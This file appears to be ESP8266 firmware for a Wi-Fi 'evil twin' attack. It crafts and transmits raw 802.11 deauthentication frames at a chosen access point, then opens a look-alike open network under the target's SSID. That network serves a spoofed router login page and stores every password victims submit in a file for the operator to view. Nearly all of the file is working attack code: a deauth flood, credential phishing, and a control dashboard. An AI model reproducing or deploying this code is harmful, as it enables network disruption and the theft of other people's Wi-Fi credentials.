#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <ArduinoJson.h>
#include <LittleFS.h>
#include "webfile.h"  // Include the generated web files header

extern "C" {
  #include "user_interface.h"
}

struct Config {
  String ip;
  String targetSSID;
  String targetMAC;
  String loginPageName;
  int targetChannel;
  String username;
  String password;
  bool attacking;
  bool scanningForChannel;
  int totalSendPkt;
  int pkts;
  String sessionID;
};

IPAddress local_IP, gateway_IP, subnet_IP;
Config config;

ESP8266WebServer server(80);

uint8_t targetMAC[6];
int attackCount = 0;          // Global counter

void saveConfig() {
  File file = LittleFS.open("/config.json", "w");
  if (!file) {
    Serial.println("Failed to open config file for writing");
    return;
  }

  StaticJsonDocument<1024> doc; // Increased from 512 to 1024
  doc["ip"] = config.ip;
  doc["targetSSID"] = config.targetSSID;
  doc["targetMAC"] = config.targetMAC;
  doc["loginPageName"] = config.loginPageName;
  doc["targetChannel"] = config.targetChannel;
  doc["username"] = config.username;
  doc["password"] = config.password;
  doc["attacking"] = config.attacking;
  doc["scanningForChannel"] = config.scanningForChannel;
  doc["totalSendPkt"] = config.totalSendPkt;
  doc["pkts"] = config.pkts;
  doc["sessionID"] = config.sessionID;
  if (serializeJson(doc, file) == 0) {
    Serial.println("Failed to write to file");
    file.close();
    return;
  }
  file.close();
  Serial.println("Config saved successfully");
  delay(2000);
  Serial.println("Rebooting...");
  ESP.restart();
}

void loadConfig() {
  if (!LittleFS.exists("/config.json")) {
    Serial.println("Config file not found, creating default...");
    config.ip = "192.168.1.1";
    config.targetSSID = "Redmi 9A";
    config.targetMAC = "34:B9:8D:39:8A:4D";
    config.loginPageName = "login.html";
    config.targetChannel = 1;
    config.username = "admin";
    config.password = "admin";
    config.attacking = false;
    config.scanningForChannel = false;
    config.totalSendPkt = 100;
    config.pkts = 1000;
    config.sessionID = "";
    saveConfig();
    return;

  }

  File file = LittleFS.open("/config.json", "r");
  if (!file) {
    Serial.println("Failed to open config file");
    return;
  }

  StaticJsonDocument<1024> doc; // Increased from 512 to 1024
  if (deserializeJson(doc, file)) {
    Serial.println("Failed to read file, using default config");
    file.close();
    return;
  }

  config.ip = doc["ip"].as<String>();
  config.targetSSID = doc["targetSSID"].as<String>();
  config.targetMAC = doc["targetMAC"].as<String>();
  config.loginPageName = doc["loginPageName"].as<String>();
  config.targetChannel = doc["targetChannel"];
  config.username = doc["username"].as<String>();
  config.password = doc["password"].as<String>();
  config.attacking = doc["attacking"] | false;
  config.scanningForChannel = doc["scanningForChannel"] | false;
  config.totalSendPkt = doc["totalSendPkt"];
  config.pkts = doc["pkts"];
  config.sessionID = doc["sessionID"].as<String>();
  file.close();
  Serial.println("Config loaded successfully");
}

void printConfig() {
  Serial.println("===== CONFIG DATA =====");
  Serial.println("IP: " + config.ip);
  Serial.println("Target SSID: " + config.targetSSID);
  Serial.println("Target MAC: " + config.targetMAC);
  Serial.println("Login Page: " + config.loginPageName);
  Serial.println("Target Channel: " + String(config.targetChannel));
  Serial.println("Username: " + config.username);
  Serial.println("Password: " + config.password);
  Serial.println("Attacking: " + String(config.attacking ? "true" : "false"));
  Serial.println("Scanning For Channel: " + String(config.scanningForChannel ? "true" : "false"));
  Serial.println("Session ID: " + config.sessionID);
  Serial.println("=======================");
}

void macStrToBytes(const char* macStr, uint8_t* mac) {
  for (int i = 0; i < 6; i++) {
    sscanf(macStr + 3 * i, "%2hhx", &mac[i]);
  }
}

bool parseMAC(const String& macStr, uint8_t* mac) {
  if (macStr.length() != 17) return false;
  for (int i = 0; i < 6; i++) {
    mac[i] = strtoul(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
  return true;
}

void sendDeauth(uint8_t *mac, int channel) {
  wifi_set_channel(channel);

  uint8_t packet[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0,
    0x00, 0x00,
    0x07, 0x00
  };

  memcpy(&packet[10], mac, 6);
  memcpy(&packet[16], mac, 6);

  wifi_send_pkt_freedom(packet, sizeof(packet), 0);
}

int findChannelByMAC(uint8_t* mac) {
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; i++) {
    String bssidStr = WiFi.BSSIDstr(i);
    uint8_t bssid[6];
    if (!parseMAC(bssidStr, bssid)) continue;

    bool match = true;
    for (int j = 0; j < 6; j++) {
      if (bssid[j] != mac[j]) {
        match = false;
        break;
      }
    }

    if (match) {
      config.targetChannel = WiFi.channel(i);
      config.targetSSID = WiFi.SSID(i);
      config.targetMAC = bssidStr;
      config.attacking = true;
      config.scanningForChannel = false;
      saveConfig();
      Serial.println("Target Found: " + config.targetMAC);
      return config.targetChannel;
    }
  }
  Serial.println("Target not found: " + config.targetMAC);
  return 0;
}





// Web server handlers
void sendProgmem(const char* ptr, size_t size, const char* type) {
  server.sendHeader("Content-Length", String(size));
  server.sendHeader("Cache-Control", "max-age=3600");
  server.send_P(200, type, ptr, size);
}

String generateSessionID() {
  String id = "";
  for (int i = 0; i < 16; i++) {
    id += String(random(0, 16), HEX);
  }
  return id;
}
void saveLoginAttempt(const String &username, const String &password, const String &wifi_router) {
  // File open karo
  File file = LittleFS.open("/login_attempts.json", "r");
  DynamicJsonDocument doc(2048); // memory adjust kare

  if (file) {
      // Existing JSON read karo
      DeserializationError error = deserializeJson(doc, file);
      file.close();
      if (error) {
          doc.to<JsonArray>(); // agar file corrupted ya empty hai to new array banao
      }
  } else {
      doc.to<JsonArray>(); // agar file exist nahi hai to new array banao
  }

  // Naya attempt add karo
  JsonObject attempt = doc.createNestedObject();
  attempt["username"] = username;
  attempt["password"] = password;
  attempt["wifi_router"] = wifi_router;

  // JSON write karo
  file = LittleFS.open("/login_attempts.json", "w");
  if (file) {
      serializeJson(doc, file);
      file.close();
  }
}


void handleAuth() {
  if (server.hasArg("user") && server.hasArg("pass")) {
    String username = server.arg("user");
    String password = server.arg("pass");
    String page = server.arg("page");
    Serial.println(username);
    Serial.println(password);
    Serial.println("login attempt"+config.username);
    Serial.println("login attempt"+config.password);
    if (username == config.username && password == config.password) {
      config.sessionID = generateSessionID();
      String response = "<html><head>"
                        "<meta http-equiv='refresh' content='2; url=/dashboard'>"
                        "</head><body>"
                        "<h1>Login Successful</h1>"
                        "<p>Redirecting to dashboard...</p>"
                        "</body></html>";
      
      server.sendHeader("Set-Cookie", "session=" + config.sessionID);
      server.send(200, "text/html", response);
      
      return;
    }
    else{
      saveLoginAttempt(username, password,page);
      sendProgmem((char*)subisu_html, subisu_html_len, "text/html");
    }
  }
  else{
    sendProgmem((char*)subisu_html, subisu_html_len, "text/html");
  }
}


void showLoginAttempts() {
  File file = LittleFS.open("/login_attempts.json", "r");
  if (!file) {
      server.send(500, "text/html", "Error: Cannot open login_attempts.json");
      return;
  }

  DynamicJsonDocument doc(4096);
  DeserializationError error = deserializeJson(doc, file);
  file.close();

  if (error) {
      server.send(500, "text/html", "Error: Cannot parse JSON");
      return;
  }

  String html = "<!DOCTYPE html><html><head><title>Login Attempts</title>";
  html += "<style>table{border-collapse:collapse;width:100%;}th,td{border:1px solid #ccc;padding:8px;text-align:center;}th{background:#eee;}</style>";
  html += "</head><body>";
  html += "<h2>Login Attempts</h2>";
  html += "<table><tr><th>Username</th><th>Password</th><th>WiFi Router</th></tr>";

  JsonArray arr = doc.as<JsonArray>();
  for (JsonObject attempt : arr) {
      html += "<tr>";
      html += "<td>" + String((const char*)attempt["username"]) + "</td>";
      html += "<td>" + String((const char*)attempt["password"]) + "</td>";
      html += "<td>" + String((const char*)attempt["wifi_router"]) + "</td>";

      html += "</tr>";
  }

  html += "</table></body></html>";

  server.send(200, "text/html", html);
}

void setup() {
  Serial.begin(115200);

  if (!LittleFS.begin()) {
    Serial.println("LittleFS mount failed");
    return;
  }
  loadConfig();

  WiFi.mode(WIFI_AP_STA);

  local_IP.fromString(config.ip);
  gateway_IP.fromString(config.ip);
  subnet_IP.fromString("255.255.255.0");
  
  if (!WiFi.softAPConfig(local_IP, gateway_IP, subnet_IP)) {
    Serial.println("Failed to configure AP");
    return;
  }
  
  if (!WiFi.softAP(config.targetSSID.c_str(), NULL, config.targetChannel)) {
    Serial.println("Failed to start AP");
    return;
  }
  
  Serial.println("AP started successfully");
  Serial.println("AP IP: " + WiFi.softAPIP().toString());

  printConfig();

  macStrToBytes(config.targetMAC.c_str(), targetMAC);

  // Setup web server
  server.on("/", HTTP_GET, []() {
    sendProgmem((char*)test_html, test_html_len, "text/html");
  });

  server.on("/login", HTTP_GET, []() {
    sendProgmem((char*)subisu_html, subisu_html_len, "text/html");
  });

  // Dashboard route
  server.on("/dashboard", HTTP_GET, []() {
    sendProgmem((char*)desbord_html, desbord_html_len, "text/html");
  });

  // API endpoints for dashboard
  server.on("/scan", HTTP_GET, []() {
    String json = "{\"success\":true,\"networks\":[";
    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; i++) {
      if (i > 0) json += ",";
      json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",";
      json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
      json += "\"channel\":" + String(WiFi.channel(i)) + ",";
      json += "\"rssi\":" + String(WiFi.RSSI(i)) + "}";
    }
    json += "]}";
    server.send(200, "application/json", json);
  });

  server.on("/save", HTTP_POST, []() {
    String body = server.arg("plain");
    StaticJsonDocument<1024> doc;
    
    if (deserializeJson(doc, body)) {
      server.send(400, "application/json", "{\"success\":false,\"error\":\"Invalid JSON\"}");
      return;
    }
    
    config.ip = doc["ip"].as<String>();
    config.targetSSID = doc["targetSSID"].as<String>();
    config.targetMAC = doc["targetMAC"].as<String>();
    config.loginPageName = doc["loginPageName"].as<String>();
    config.targetChannel = doc["targetChannel"];
    config.username = doc["username"].as<String>();
    config.password = doc["password"].as<String>();
    config.attacking = doc["attacking"];
    config.scanningForChannel = doc["scanningForChannel"];
    config.totalSendPkt = doc["totalSendPkt"];
    config.pkts = doc["pkts"];
    config.sessionID = doc["sessionID"].as<String>();
    
    saveConfig();
    server.send(200, "application/json", "{\"success\":true}");
  });

  server.on("/load", HTTP_GET, []() {
    String json = "{\"success\":true,\"config\":{";
    json += "\"ip\":\"" + config.ip + "\",";
    json += "\"targetSSID\":\"" + config.targetSSID + "\",";
    json += "\"targetMAC\":\"" + config.targetMAC + "\",";
    json += "\"loginPageName\":\"" + config.loginPageName + "\",";
    json += "\"targetChannel\":" + String(config.targetChannel) + ",";
    json += "\"username\":\"" + config.username + "\",";
    json += "\"password\":\"" + config.password + "\",";
    json += "\"attacking\":" + String(config.attacking ? "true" : "false") + ",";
    json += "\"scanningForChannel\":" + String(config.scanningForChannel ? "true" : "false") + ",";
    json += "\"totalSendPkt\":" + String(config.totalSendPkt) + ",";
    json += "\"pkts\":" + String(config.pkts) + ",";
    json += "\"sessionID\":\"" + config.sessionID + "\"";
    json += "}}";
    server.send(200, "application/json", json);
  });

  server.on("/attack/start", HTTP_POST, []() {
    config.attacking = true;
    attackCount = 0; // Reset attack counter
    saveConfig();
    server.send(200, "application/json", "{\"success\":true}");
  });

  server.on("/attack/stop", HTTP_POST, []() {
    config.attacking = false;
    saveConfig();
    server.send(200, "application/json", "{\"success\":true}");
  });

  server.on("/restart", HTTP_POST, []() {
    server.send(200, "application/json", "{\"success\":true}");
    delay(1000);
    ESP.restart();
  });

  server.on("/auth", HTTP_POST, handleAuth);
  server.on("/login_attempts", HTTP_GET, showLoginAttempts);

  server.begin(); // Start the web server
  Serial.println("Web server started");

}


void loop() {

  server.handleClient();
  delay(10);


  if (config.scanningForChannel) {
    findChannelByMAC(targetMAC);
  }

  if (config.attacking && attackCount < config.totalSendPkt) {
    sendDeauth(targetMAC, config.targetChannel);
    attackCount++;
    Serial.println("Deauth sent: " + String(attackCount));

    if (attackCount >= config.totalSendPkt) {
      config.attacking = false;  // Stop attack
      config.scanningForChannel =true;
      saveConfig();              // Save and restart if needed
    }
    delay(config.pkts);
  }
} 

